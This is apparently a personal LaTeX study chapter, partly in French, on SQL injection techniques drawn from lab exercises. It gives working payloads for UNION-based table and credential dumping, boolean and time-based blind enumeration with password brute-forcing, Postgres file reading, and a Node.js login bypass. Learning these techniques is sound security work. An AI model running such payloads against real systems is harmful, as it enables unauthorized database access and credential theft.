\chapter{SQLI: SQL Injection}
\section{First order SQL injection}
\begin{itemize}
\item \url{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass}
\item \url{https://portswigger.net/web-security/sql-injection}
\item \url{https://portswigger.net/web-security/sql-injection/blind}
\item \url{https://portswigger.net/web-security/sql-injection/union-attacks}
\item \url{https://portswigger.net/web-security/sql-injection/examining-the-database}
\item \url{https://portswigger.net/web-security/sql-injection/cheat-sheet}
\item \url{https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/}
\item \url{https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet}
\end{itemize}


\subsection{Encoding}


\begin{tabular}{|l|l|}
Payload & URL Encoded \\
 ' & \% 27 \\
 " & \% 22 \\
 \# & \% 23 \\
 ; & \% 3B \\
 ) & \% 29 \\
 \end{tabular}

\subsection{In-Band SQL Injection}
union-based injection
utile sur un get qui retourne un seul enregistrement


\textbf{Step 1}: Location of Injection
rechercher un retour empty

\textbf{Step 2}: Detect number of columns

\begin{verbatim}
Using ORDER BY (order by 1, order by 2-- ...)
Using UNION (union select 1 -- union select 1,2i -- ...)
\end{verbatim}


Savoir combien d'éléments sont retournés par le select en essayer successivement “union 1,..." jusqu'a ce qu'il n'y ai plus d'erreur

Location of Injection
rechercher les champ de la requete qui s'affichent et y placer le payload


\begin{verbatim}
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
\end{verbatim}



\subsection{Error based SQL injection}
\subsection{Blind SQL injection}

\subsubsection{Boolean based}
Enumeration technic for true/false API such as 
\verb+https://website.thm/checkuser?username=admin+

behind such API there is a SQL request of type 

\begin{verbatim}
select * from users where username = '%username%' LIMIT 1;
\end{verbatim}

\textbf{Step 1}: look for a parameter value that will produce an empty record
set and therefore a  false result to the request
execution

\textbf{Step 2}: Detect number of columns
\begin{verbatim}
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1, 2;--
...
\end{verbatim}

\textbf{Step 3} Enumérate

\begin{verbatim}
admin123' UNION SELECT 1,2,3 where database() like '%';--
dmin123' UNION SELECT 1,2,3 where database() like 's%';--
admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
admin123' UNION SELECT 1,2,3 where database() like 'sql_three%';--
...
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
...
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
\end{verbatim}

Par contre quand on trouve un champ  il faut l'exclure pour pouvoir continuer a énumérer  les champs
\begin{verbatim}
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

\end{verbatim}
maintenant on a la structure de la table.
on cherhce un utilisateur qui existe 
\verb+ admin123' UNION SELECT 1,2,3 from users where username like 'a%+
puis bruteforce du password 
\verb+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%+

\subsubsection{Time based Injection}
A  time-based blind SQL Injection is very similar to the above Boolean  based, in that the same requests are sent, but there is no visual  indicator of your queries being wrong or right this time. Instead, your  indicator of a correct query is based on the time the query takes to  complete. This time delay is introduced by using built-in methods such  as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

field enumération

\begin{verbatim}
admin123' UNION SELECT SLEEP(5);--
\end{verbatim}
si prend 5 sec c'est que c'est bon

\begin{verbatim}
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
\end{verbatim}


\section{Second order SQL injection}

\url{https://infosecwriteups.com/the-wrath-of-second-order-sql-injection-c9338a51c6d}

A second order sqli arise when the malicious code injected into an application
by the attacker which does not get immediately executed in the application.


The user-provided data becomes a threat when it is utilized by the application
or any other application wherein the injected code provided by the attacker
gets activated resulting in successful exploitation.

Usually this arise when the malicious input is njected into persistent storage
(such as a table row) which is deemed as a trusted source for other activities.

Automated web-application assessment tools are not adequate to identify these
vulnerabilities. An automated tool is not smart enough to identify the change
in application behavior in any of the subsequent responses caused by the
malicious injection in one of the previous queries.

This kind of vulnerability happens because a good programmer maybe will patch
his code to prevent SQL injections in forms where the user can input something
BUT he will not do the same thing where a user doesn’t have any sort of
interaction with the application database.


SQLMap can exploit Second Order SQLis

\section{Postgres SQLi}

\subsection{Reading/writting files}
\url{http://shuber.io/reading-from-the-filesystem-with-postgres/}

\begin{verbatim}
select pg_ls_dir

pg_read_file
\end{verbatim}


\section{MySQL}

\url{https://www.asafety.fr/en/mysql-injection-cheat-sheet/}

\subsection{testing}

\subsubsection{Numeric value}

Considering the following request
\begin{verbatim}
SELECT * FROM Table WHERE data = [INJ];
\end{verbatim}

\begin{verbatim}
AND 1 	True
AND 0 	False
AND true 	True
AND false 	False
1-false 	Retourne 1 si vulnérable
1-true 	Retourne 0 si vulnérable
1*1337 	Retourne 1337 si vulnérable
\end{verbatim}



\section{NodeJS}

\href{https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/}{Node.js
SQL Injection Guide}

\begin{verbatim}
app.post("/auth", function (request, response) {
 var username = request.body.username;
 var password = request.body.password;
 if (username && password) {
  connection.query(
   "SELECT * FROM accounts WHERE username = ? AND password = ?",
   [username, password],
   function (error, results, fields) {
    ...
   }
  );
 }
});
...
\end{verbatim}

\begin{verbatim}
body: "username=admin&password[password]=1"
\end{verbatim}

In this example, the attacker is passing in a value that gets evaluated as an Object instead of a String value, and results in the following SQL query:

\begin{verbatim}
SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1
\end{verbatim}
The \verb+password = `password` = 1+ part evaluates to \verb+TRUE+ and is a
\verb+1=1+ attack.
